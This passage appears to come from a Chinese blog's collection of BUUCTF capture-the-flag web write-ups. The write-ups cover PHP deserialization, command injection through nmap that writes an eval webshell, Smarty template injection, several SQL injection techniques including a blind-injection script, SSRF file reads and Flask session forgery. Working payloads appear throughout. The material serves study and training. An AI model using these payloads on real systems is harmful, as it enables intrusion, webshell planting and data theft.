$this->p);\n            }\n        }\n    }\n    $func = $_REQUEST[\"func\"];\n    $p = $_REQUEST[\"p\"];\n\n    if ($func != null) {\n        $func = strtolower($func);\n        if (!in_array($func,$disable_fun)) {\n            echo gettime($func, $p);\n        }else {\n            die(\"Hacker...\");\n        }\n    }\n    ?>\n```\n\n\n\n看到类就想到反序列化漏洞 将类中的属性值改为我们可以恶意操作的值 然后给`$func`传反序列化函数，给`p`传我们的序列化结果。\n\n思路就是直接反序列化将原本post值修改 不通过黑名单筛选\n\n本地构造：\n\n```php\n<?php\n    class Test {\n        var $p = \"ls /\";\n        var $func = \"system\";}\n$a = new Test;\necho serialize($a);\n?>\n```\n\n构造payload：`func=unserialize&p=O:4:\"Test\":2:{s:1:\"p\";s:4:\"ls /\";s:4:\"func\";s:6:\"system\";}`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340578.png)\n\n发现并没有flag文件 所以只能通过find指令寻找了 这里省略 我这里find找不出来没有回响 环境有问题\n\n最后构造payload：`func=unserialize&p=O:4:\"Test\":2:{s:1:\"p\";s:22:\"cat /tmp/flagoefiu4r93\";s:4:\"func\";s:6:\"system\";}`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340505.png)\n","tags":["文件包含","反序列化","代码审计"],"categories":["buuctf"]},{"title":"buuctf 36-[BUUCTF 2018]Online Tool","url":"/post/9efd4054.html","content":"\nbuuctf [BUUCTF 2018]Online Tool\n\n<!--more-->\n\n源码附上\n\n```php\n<?php\n\nif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];\n}\n\nif(!isset($_GET['host'])) {\n    highlight_file(__FILE__);\n} else {\n    $host = $_GET['host'];\n    $host = escapeshellarg($host);\n    $host = escapeshellcmd($host);\n    $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']);\n    echo 'you are in sandbox '.$sandbox;\n    @mkdir($sandbox);\n    chdir($sandbox);\n    echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host);\n}\n```\n\n有许多不清楚的知识，一个一个来看\n\n$_SERVER\n\n$_SERVER 是PHP预定义的超全局变量。所谓“超全局变量”，即在脚本全部作用域中都可以使用，保存关于报头、路径和脚本位置的信息。\n\n$_SERVER详解\n$_SERVER[‘HTTP_ACCEPT_LANGUAGE’]//浏览器语言\n$_SERVER[‘REMOTE_ADDR’] //当前用户 IP 。\n$_SERVER[‘REMOTE_HOST’] //当前用户主机名\n$_SERVER[‘REQUEST_URI’] //URL\n$_SERVER[‘REMOTE_PORT’] //端口。\n$_SERVER[‘SERVER_NAME’] //服务器主机的名称。\n$_SERVER[‘PHP_SELF’]//正在执行脚本的文件名\n$_SERVER[‘argv’] //传递给该脚本的参数。\n$_SERVER[‘argc’] //传递给程序的命令行参数的个数。\n$_SERVER[‘GATEWAY_INTERFACE’]//CGI 规范的版本。\n$_SERVER[‘SERVER_SOFTWARE’] //服务器标识的字串\n$_SERVER[‘SERVER_PROTOCOL’] //请求页面时通信协议的名称和版本\n$_SERVER[‘REQUEST_METHOD’]//访问页面时的请求方法\n$_SERVER[‘QUERY_STRING’] //查询(query)的字符串。\n$_SERVER[‘DOCUMENT_ROOT’] //当前运行脚本所在的文档根目录\n$_SERVER[‘HTTP_ACCEPT’] //当前请求的 Accept: 头部的内容。\n$_SERVER[‘HTTP_ACCEPT_CHARSET’] //当前请求的 Accept-Charset: 头部的内容。\n$_SERVER[‘HTTP_ACCEPT_ENCODING’] //当前请求的 Accept-Encoding: 头部的内容\n$_SERVER[‘HTTP_CONNECTION’] //当前请求的 Connection: 头部的内容。例如：“Keep-Alive”。\n$_SERVER[‘HTTP_HOST’] //当前请求的 Host: 头部的内容。\n$_SERVER[‘HTTP_REFERER’] //链接到当前页面的前一页面的 URL 地址。\n$_SERVER[‘HTTP_USER_AGENT’] //当前请求的 User_Agent: 头部的内容。\n$_SERVER[‘HTTPS’]//如果通过https访问,则被设为一个非空的值(on)，否则返回off\n$_SERVER[‘SCRIPT_FILENAME’] #当前执行脚本的绝对路径名。\n$_SERVER[‘SERVER_ADMIN’] #管理员信息\n$_SERVER[‘SERVER_PORT’] #服务器所使用的端口\n$_SERVER[‘SERVER_SIGNATURE’] #包含服务器版本和虚拟主机名的字符串。\n$_SERVER[‘PATH_TRANSLATED’] #当前脚本所在文件系统（不是文档根目录）的基本路径。\n$_SERVER[‘SCRIPT_NAME’] #包含当前脚本的路径。这在页面需要指向自己时非常有用。\n$_SERVER[‘PHP_AUTH_USER’] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。\n$_SERVER[‘PHP_AUTH_PW’] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。\n$_SERVER[‘AUTH_TYPE’] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型\n\n第一部分\n\nX-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段\n\n```php\nif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];\n}\n```\n\n获取本机的ip\n\n第二部分：\n\n有两个很重要的函数\n\n**escapeshellarg会首先在单引号前加反斜线，然后将单引号分割的几部分，都用单引号括起来****\n****escapeshellcmd会将&#;`|\\*?~<>^()[]{}$\\, \\x0A 和 \\xFF以及不配对的单/双引号转义**\n\n举个例子\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341140.png)\n\n注意这里环境一定要在linux才行 如果环境在window会出现以下情况，目前还没弄懂是啥原因\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341179.png)\n\n这样当这两个函数混合在一起使用时，就会导致，转义的单引被绕过。\n\n有了著名的漏洞 附上大佬的链接学习 https://paper.seebug.org/164/\n\n题目中给出的是nmap命令，拼接上我们可控的参数$host，那么就可以通过添加nmap参数执行将命令和结果写入文件的操作，写入一句话木马。目前还没有学习到nmap，暂时先不解释。\n\nnmap写入文件的参数是 -oG\n\n\n\nmkdir ()— 新建目录\n\nchdir ()— 改变目录\n\n构造peyload\n\n```\n?host='<?php @eval($_POST[x]); ?> -oG 1.php '` 注意此处有空格 当时一直没做出来 要有空格 不然nmap执行后面的文件就会变成 `1.php//\n```\n\n经过两次函数之后\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341131.png)\n\n```\n''\\\\''\\<\\?php @eval\\(\\$_POST\\[\"hack\"\\]\\)\\;\\?\\>  -oG 1.php '\\\\'''\n```\n\n图片不知道为啥把我eval中的内容吞了不知道为啥\n\n相当于\n\n```\n\\\\ <?php @eval($_POST[x]); ?> -oG 1.php \\\\\n```\n\n相当于执行了 \n\n```\nsystem(\"nmap -T5 -sT -Pn --host-timeout 2 -F \\\\ <?php @eval($_POST[x]); ?> -oG 1.php \\\\\")\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341212.png)\n\n产生的文件夹名 被md5加密了\n\n之后访问的时候加上就行\n\n成功\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341036.png)\n\n感悟: nmap还一点都没有学习，做这个题费了好大劲，之后有空要去涉略一下nmap。\n","tags":["nmap","$_SERVER","esc***函数"],"categories":["buuctf"]},{"title":"buuctf 35-[BJDCTF2020]The mystery of ip","url":"/post/a4341e77.html","content":"\nbuuctf [BJDCTF2020]The mystery of ip\n\n<!--more-->\n\n这道题考到了模板注入简单记录一些吧  参考：https://houbb.github.io/2020/08/09/web-safe-12-ssti\n\n服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题.  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342348.png)\n\n获取到了我们的ip，第一时间就想到了修改xff\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342770.png)\n\n但是没啥用 思路大概是就是利用xff 进行恶意读取吧 看了wp 是php的smarty模板注入 参考：https://www.anquanke.com/post/id/272393\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342128.png)\n\n代码直接运行了 于是直接进行命令执行就行\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342033.png)\n\n直接读根目录flag文件就行了\n","tags":["模板注入","xff","smarty模板"],"categories":["buuctf"]},{"title":"buuctf 34-[RoarCTF 2019]Easy Java","url":"/post/d05894c4.html","content":"\nbuuctf 34-[RoarCTF 2019]Easy Java\n\n<!--more-->\n\n弱口令能爆出来：\n\n账号:admin\n\n密码: admin888\n\n但是没啥用 还是所以只剩下登录页面的帮助了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082343030.png)\n\n这里考到了java 的 WEB-INF 知识点 参考：https://www.cnblogs.com/shamo89/p/9948707.html\n\n但是这里通过get方式传参是不行的 只能通过post\n\n构造 payload： `filename=WEB-INF/web.xml`\n\nWEB-INF/web.xml  ： Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则   可以找到flag的位置以及命名方式\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082343221.png)\n\n找到了flag的地址 以及他的命名文件\n\n秉持java 万物都是类的原则 要读取flag 就要读这个flag类\n\nWEB-INF/classes/\n\n 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中（是该目录不能包含在.jar文件中）  \n\n构造payload ：`filename=WEB-INF/classes/com/wm/ctf/FlagController.class`不要忘了class后缀 一开始就忘了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082343109.png)\n\n解码 得到flag！\n","tags":["弱口令","java"],"categories":["buuctf"]},{"title":"buuctf 33-[网鼎杯 2018]Fakebook","url":"/post/c6fe9d66.html","content":"\nbuuctf [网鼎杯 2018]Fakebook\n\n<!--more-->\n\n日常访问robots.txt文件\n\n robots.txt 文件规定了搜索引擎抓取工具可以访问您网站上的哪些网址。  \n\n发现有个文件可以打开\n\n附上源码：\n\n```plain\n<?php\n\n\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n\n    public function __construct($name, $age, $blog)\n    {\n        $this->name = $name;\n        $this->age = (int)$age;\n        $this->blog = $blog;\n    }\n\n    function get($url)\n    {\n        $ch = curl_init();\n\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n        $output = curl_exec($ch);\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) {\n            return 404;\n        }\n        curl_close($ch);\n\n        return $output;\n    }\n\n    public function getBlogContents ()\n    {\n        return $this->get($this->blog);\n    }\n\n    public function isValidBlog ()\n    {\n        $blog = $this->blog;\n        return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);\n    }\n\n}\n```\n\n是一个php写的类 然后用了curl\n\ncurl:https://blog.csdn.net/yangyu112654374/article/details/4658854\n\n然后发现有 `$output = curl_exec($ch)` 可以将类中`blog`重新构造用来执行ssrf漏洞\n\nhttps://xz.aliyun.com/t/11215 直接看大佬的总结\n\n申请一个账号进入可以看到存在sql注入\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344592.png) \n\n判断是什么类型注入\n\n`no=1 and 1=1#` 可以\n\n`no=1 and 1=2#` 不行\n\n说明这是数字注入\n\n`?no=0 order by 4#`  四列\n\n报错注入(这里比较推荐报错 联合查询的话一开始找不到回显点 可能是我眼瞎)\n\n其实是过滤了 `union select` 用`union/**/select` 绕过就行\n\n`1 and updatexml(1,concat('~',database(),'~'),3)#` 注意~ 不能用十六进制的 0x7e 这里有检测 用回原型好就行\n\n[*] query error! (XPATH syntax error: '~fakebook~')\n\n```\n1 and updatexml(1,concat('~',select user(),'~'),3)# \n```\n\n联合注入\n\n```\n?no=-1 union/**/select 1,database(),3,4#\n```\n\nfakebook\n\n```\n?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'#\n```\n\nusers\n\n```\n?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#\n```\n\nno,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS\n\n `?no=-1 union/**/select 1,group_concat(no,username,passwd,data),3,4 from users#`\n\n 1admin3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2O:8:\"UserInfo\":3:{s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:1;s:4:\"blog\";s:11:\"www.123.com\";}\n\n 利用ssrf漏洞 读取内容\n\n构造类里的 blog属性值为 `s:29:\"file:///var/www/html/flag.php\"`\n\n 构造payload: `?no=-1 union/**/select 1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:1;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'`\n\n得到base64码\n\n```\nPD9waHANCg0KJGZsYWcgPSAiZmxhZ3s1MTkzODdkNS02OWQ2LTQ0OGEtYWQyZS0wODgxYmJkOThiNDl9IjsNCmV4aXQoMCk7DQo=\n```\n\n<?php\n\n\n\n$flag = \"flag{519387d5-69d6-448a-ad2e-0881bbd98b49}\";\n\nexit(0);\n\n\n\n法二：\n\n```\n?no=-1 union/**/select 1,load_file('/var/www/html/flag.php'),3,4#\n```\n\n之前看到用户是管理员 所以联想到用load_file函数\n\n去这里看https://www.cnblogs.com/junlebao/p/14104036.html\n","tags":["sql注入","robots.txt","反序列化","curl","ssrf"],"categories":["buuctf"]},{"title":"buuctf 32-[CISCN2019 华北赛区 Day2 Web1]Hack World","url":"/post/3b320c12.html","content":"\nbuuctf CISCN2019 华北赛区 Day2 Web1]Hack World\n\n<!--more-->\n\n这道题是一道比较经典的布尔盲注的题目，也就全当作是学习了。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344880.png)\n\n题目表示flag在flag表里的flag字段里 这点就很可疑\n\n输入 1，2都有正确的回显\n\n输入`1'`时显示\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344854.png)\n\n显示布尔（错误），这里就可以判断是布尔注入了\n\n好好学习一下布尔盲注的知识：\n\n这里有篇布尔盲注的的文章：https://blog.csdn.net/wangyuxiang946/article/details/123486880 可以学习学习\n\nsubstr(string,开始1，长度)函数 用于截取字符串的部分字符串\n\nasscii() 用于将字符转化成ascii编码\n\n这里本地搭了一个环节测试\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344816.png)\n\n在题目测试一下\n\n```\nselect ascii(substr((select flag from flag),1,1))\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344111.png)\n\n发现被过滤了 fuzz一下哪些被过滤了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344901.png)\n\n发现一些常用的 空格 `or union` 都被过滤了 `/**/`绕过空格也被过滤了 所以只能用`()`来绕过\n\n构造payload：\n\n```\nselect(ascii(substr((select(flag)from(flag),1,1)))\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344886.png)\n\n正常回显了\n\n这里再用到mysql 的if语句\n\nif(条件，成功回显，失败回显)\n\n本地测试\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344175.png)\n\n这是为什么条件等于84 是因为 我本地flag的第一个字母为T ascii编码为84\n\n构造payload：`if(ascii(substr((select(flag)from(flag)),1,1))=102,1,0)`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344201.png)\n\n成功回显 至于为什么是102 因为flag开头f 的ascii编码为102\n\n那么就可以借助脚本，这里因为我python没怎么学，脚本不会写\n\n但是整体脚本思路为 当匹配字符ascii 与题目相同时回显1 否则回显0 脚本根据题目回显的语句进行判断\n\n然后遍历整个32-126 ascii编码字符\n\n这里放一下大佬的脚本：\n\n```python\nimport requests\nimport time\nimport re\nurl='http://4fdaca11-2d67-4dbe-b046-a42e64af5917.node4.buuoj.cn:81/index.php'\nflag = ''\nfor i in range(1,43):\n    max= 127\n    min = 0\n    for c in range(0,127):\n        s = (int)((max+min)/2)\n        payload = '0^(ascii(substr((select(flag)from(flag)),'+str(i)+',1))>'+str(s)+')'\n        r = requests.post(url,data = {'id':payload})\n        time.sleep(0.005)\n        if 'Hello, glzjin wants a girlfriend.' in str(r.content):\n            min=s\n        else:\n            max=s\n        if((max-min)<=1):\n            flag+=chr(max)\n            print(flag)\n            break\n```\n\n以后有时间要滚去学习写写脚本了qwq\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344220.png)\n","tags":["sql注入","布尔盲注","脚本"],"categories":["buuctf"]},{"title":"buuctf 31-[GYCTF2020]Blacklist","url":"/post/a8bde72c.html","content":"\nbuuctf [GYCTF2020]Blacklist\n\n<!--more-->\n\n这道题又是一道学习的题目，打开看到界面ui很像一道堆叠注入的题目，刚好这道题也是用堆叠注入\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345646.png)\n\n查字段：`1' order by 3#`\n\n`error 1054 : Unknown column '3' in 'order clause'` 只有两列\n\n这道题过滤了 \n\n```\nreturn preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n\n不能用预编译 select 报错注入应该是\n\n```\n1'; show databases#\n```\n\n\"supersqli\"\n\n```\n1'; show tables#\n```\n\n\"FlagHere\"\n\n```\n1';show columns from FlagHere#\n```\n\n直接用`1';desc FlagHere#`也可以\n\n  string(4) \"flag\"\n\ndesc用法：\n\n1.查表的详细信息  eg：`desc table_name;`\n\n2.desc降序排列数据  eg: `select select ename,sal from emp order by sal desc; `\n\n手动指定按照薪水由大到小排序（降序关键字desc）\n\n然后这里用到了 mysql handler语句查询字段内的信息\n\n这条语句使我们能够一行一行的浏览一个表中的数据\n\n下面在本地搭了一个环境进行测试 如下：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345725.png)\n\n之后就可以构造payload：\n\n```\n1';HANDLER FlagHere open;HANDLER FlagHere read first;HANDLER FlagHere close;# \n```\n\n成功\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345650.png)\n","tags":["sql注入","堆叠注入","handler用法"],"categories":["buuctf"]},{"title":"buuctf 29-[GXYCTF2019]BabySQli","url":"/post/b32b8b53.html","content":"\nbuuctf [GXYCTF2019]BabySQli\n\n<!--more-->\n\n抓包发现一串密文：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346082.png)\n\n`MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5` 这是一串base32编码，base32编码特征是只有大写字母和数字\n\n解密后：`c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==` 这是一串base64编码，base64编码特点是有大小写字母和数字而且末尾常常是等于号\n\n解码 得到：`select * from user where username = '$name'`\n\n意思是让我们从登录名进行注入\n\n这个题目过滤了蛮多常用查询字符，可以bp抓包 fuzz一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345905.png)\n\n显示419就是被河蟹的 415就是正常回显\n\n过滤了 常用的`or``（）` 然后可以大写绕过\n\n构造`1' Order by 4#` 发现报错只有三列\n\n这里再提供一种select查询爆字段的方法\n\n`select 1,2#` 报错 `select 1,2,3#` 正常回显也可以用来判断字段数\n\n然后就不会了 看了其他大佬的wp\n\n这里利用了一个mysql联合查询的特性：\n\n**union做查询时，查询的数据不存在，那么联合查询就会创建一个虚拟的数据存放在数据库中**\n\n具体可以看这篇大佬的详细wp：https://www.tqwba.com/x_d/jishu/272679.html\n\n由于只能通过admin账户,因此让虚拟用户的名字是admin 同时密码转换成了md5存储(猜测应该是为了保护用户的隐私,md5不可逆,这就让即使身为管理员也不能知道用户密码)于是在构造的时候要注意数据库密码应该是md5模式的.同时登入时输入对应的明文密码即可。\n\n 构造：`name=123'union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1`\n\n其中 md5值为1的md5值，这里就是构造了 当后台检测`1 = md（1）`时为真 成功登录\n\n其实就是 后台去查找符合密码为1的md5值  但是本来没有 我们利用联合查询特性构造了一个无中生有 于是能成功登录\n","tags":["sql注入","联合查询特性","base32"],"categories":["buuctf"]},{"title":"buuctf 25-[极客大挑战 2019]HardSQL","url":"/post/58b11103.html","content":"\nbuuctf [极客大挑战 2019]HardSQ\n\n<!--more-->\n\n这个题目是报错注入的典型，值得记录一下\n\n简单尝试之后常见的字符比如空格 union都被黑名单了 尝试用/**/绕过空格但还是不行，只能用（）来绕过空格\n\n这里测试空格是否被河蟹 不能通过1'加空格 这样测试是不对的\n\n最好是用`1' #`这样测试比较正确，因为一般题目不会河蟹#字符\n\n空格绕过的原理： 括号是来包含子查询的，任何可以计算出结果的语句都可以用括号围起来，而括号的两端，可以没有多余的空格  \n\nso 所以只能用报错注入了，这里就好好回顾一下报错注入\n\n一般报错注入分为两个函数：updatexml() 与extractvalue()\n\n就拿updatexml举例 他们两的差别就只是传参上\n\n`updatexml(1，2，3)`函数总共有三个参数，当第二个参数有特殊符号时，就会触发数据库报错，而且将参数2的内容显示在报错信息中，常用是`~`他的十六进制用`0x7e`表示\n\n然后，报错注入常用拼接函数 concat和group_concat\n\n`concat`和`group_concat`都是用在sql语句中做拼接使用的，但是两者使用的方式不尽相同，`concat`是针对以行数据做的拼接，而`group_concat`是针对列做的数据拼接，且`group_concat`自动生成逗号。\n\n所以格式一般为：`updatexml(1,concat(0x7e,sql语句,0x7e),1)`\n\n然而，`extractvalue(1，2`)只有两个参数，当第二个参数具有特殊符号时，则会报错。\n\n格式为：`extractvalue( 1,concat(0x7e,sql语句))`\n\n回到题目：\n\n其实题目本身就是考察报错注入与绕过空格 这里就简单谢谢payload：\n\n```\n1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#\n```\n\nXPATH syntax error: '~geek~'\n\n```\n1'or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like('geek')),0x7e),1))#\n```\n\nXPATH syntax error: '~H4rDsq1~'\n\n```\n1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#\n```\n\nXPATH syntax error: '~id,username,password~'\n\n```\n1'or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#\n```\n\nXPATH syntax error: '~1flagflag{9804c176-72e3-46d2-90'\n\n这里flag显示的不完全，用到left 和 right函数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346493.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346308.png)\n\n```\n1'or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#\n```\n\nXPATH syntax error: '~04c176-72e3-46d2-902b-0e79f4ea1'\n\n查询到其余的flag\n\n因为还河蟹了= 所以用了like语句\n\n完成！\n","tags":["sql注入","报错注入","空格绕过"],"categories":["buuctf"]},{"title":"buuctf 22-admin","url":"/post/b64980cf.html","content":"\nbuuctf  admin\n\n<!--more-->\n\n这到题目有一个非预期，弱口令直接爆出来了，直接账号为admin，密码为123就能拿到flag，我还想这题怎么这么简单，看了别人的题解才发现又是一道学习的题目。\n\n预期解：\n\n先申请一个账号，抓包看到：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346193.png)\n\n那么这道题的思路就是让我去登录管理员的账号就能拿到flag了，但是不知道密码\n\n学习别人的wp：\n\n在源码中发现一个github链接：<!-- https://github.com/woadsl1234/hctf_flask/ -->\n\n打开是一个flask项目，Flask是一个用Python编写的Web应用程序框架\n\n比较重要的文件就是：\n\nuser.sql这是一个建数据库的文件\n\nrun.py 就是启动这个程序 把端口开放在互联网中\n\napp文件中 routes.py 对应路由 非常重要 flask中就是一个一个路由组成的\n\n查看源码：\n\n```php\n#!/usr/bin/env python\n# -*- coding:utf-8 -*-\n\n\nfrom flask import Flask, render_template, url_for, flash, request, redirect, session, make_response\nfrom flask_login import logout_user, LoginManager, current_user, login_user\nfrom app import app, db\nfrom config import Config\nfrom app.models import User\nfrom forms import RegisterForm, LoginForm, NewpasswordForm\nfrom twisted.words.protocols.jabber.xmpp_stringprep import nodeprep\nfrom io import BytesIO\nfrom code import get_verify_code\n\n\n@app.route('/code')\ndef get_code():\n    image, code = get_verify_code()\n    # 图片以二进制形式写入\n    buf = BytesIO()\n    image.save(buf, 'jpeg')\n    buf_str = buf.getvalue()\n    # 把buf_str作为response返回前端，并设置首部字段\n    response = make_response(buf_str)\n    response.headers['Content-Type'] = 'image/gif'\n    # 将验证码字符串储存在session中\n    session['image'] = code\n    return response\n\n\n@app.route('/')\n@app.route('/index')\ndef index():\n    return render_template('index.html', title = 'hctf')\n\n\n@app.route('/register', methods = ['GET', 'POST'])\ndef register():\n\n\n    if current_user.is_authenticated:\n        return redirect(url_for('index'))\n\n\n    form = RegisterForm()\n    if request.method == 'POST':\n        name = strlower(form.username.data)\n        if session.get('image').lower() != form.verify_code.data.lower():\n            flash('Wrong verify code.')\n            return render_template('register.html', title = 'register', form=form)\n        if User.query.filter_by(username = name).first():\n            flash('The username has been registered')\n            return redirect(url_for('register'))\n        user = User(username=name)\n        user.set_password(form.password.data)\n        db.session.add(user)\n        db.session.commit()\n        flash('register successful')\n        return redirect(url_for('login'))\n    return render_template('register.html', title = 'register', form = form)\n\n\n@app.route('/login', methods = ['GET', 'POST'])\ndef login():\n    if current_user.is_authenticated:\n        return redirect(url_for('index'))\n\n\n    form = LoginForm()\n    if request.method == 'POST':\n        name = strlower(form.username.data)\n        session['name'] = name\n        user = User.query.filter_by(username=name).first()\n        if user is None or not user.check_password(form.password.data):\n            flash('Invalid username or password')\n            return redirect(url_for('login'))\n        login_user(user, remember=form.remember_me.data)\n        return redirect(url_for('index'))\n    return render_template('login.html', title = 'login', form = form)\n\n\n@app.route('/logout')\ndef logout():\n    logout_user()\n    return redirect('/index')\n\n\n@app.route('/change', methods = ['GET', 'POST'])\ndef change():\n    if not current_user.is_authenticated:\n        return redirect(url_for('login'))\n    form = NewpasswordForm()\n    if request.method == 'POST':\n        name = strlower(session['name'])\n        user = User.query.filter_by(username=name).first()\n        user.set_password(form.newpassword.data)\n        db.session.commit()\n        flash('change successful')\n        return redirect(url_for('index'))\n    return render_template('change.html', title = 'change', form = form)\n\n\n@app.route('/edit', methods = ['GET', 'POST'])\ndef edit():\n    if request.method == 'POST':\n        \n        flash('post successful')\n        return redirect(url_for('index'))\n    return render_template('edit.html', title = 'edit')\n\n\n@app.errorhandler(404)\ndef page_not_found(error):\n    title = unicode(error)\n    message = error.description\n    return render_template('errors.html', title=title, message=message)\n\n\ndef strlower(username):\n    username = nodeprep.prepare(username)\n    return username\n```\n\n## 预期解一：\n\nunicode特殊字符绕过\n\n代码审计 看到上面注册，登录，修改系统均有一个转小写的操作strlower(),并且这个转小写的函数不是python自带的，是自己封装的，那么这是非常不正常的。\n\n```php\ndef strlower(username):\n    username = nodeprep.prepare(username)\n    return username\n```\n\n这里通过调用nodeprep模块，nodeprep.prepare这个方法是将大写字母转换成小写字母，但是它存在一个问题：它会将unicode编码的ᴬ转化成A\n\n在代码开头有一行代码：`from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep`，说明nodeprep是从twisted模块中导入的，利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。而值得注意的是strlower()自定义函数被调用了三次，分别是register、login、change，即注册、登陆、修改密码时都会被调用。\n\n思路：用ᴬdmin注册，后台代码就会调用一次nodeprep.prepare函数，把用户名转换成Admin；修改一次密码，再次调用nodeprep.prepare函数，使用户名由Admin转换为admin，重新登陆，就可以得到flag。\n\n## 预期解二：\n\n抓包发现session\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346152.png)\n\nflask session伪造\n\n先了解一下session：简单说就是保持会话登录，识别用户\n\n但是一般session是存储在服务器的，但是flask存储在客户端，他是对称加密解密，所以可以进行解码然后伪造编码上传。\n\n在config.py拿到密钥`ckj123` 待会进行加密解密的时候用\n\n```php\nimport os\n\n\nclass Config(object):\n    SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'\n    SQLALCHEMY_DATABASE_URI = 'mysql+pymysql://root:adsl1234@db:3306/test'\n    SQLALCHEMY_TRACK_MODIFICATIONS = True\n```\n\n从网上下载一个session 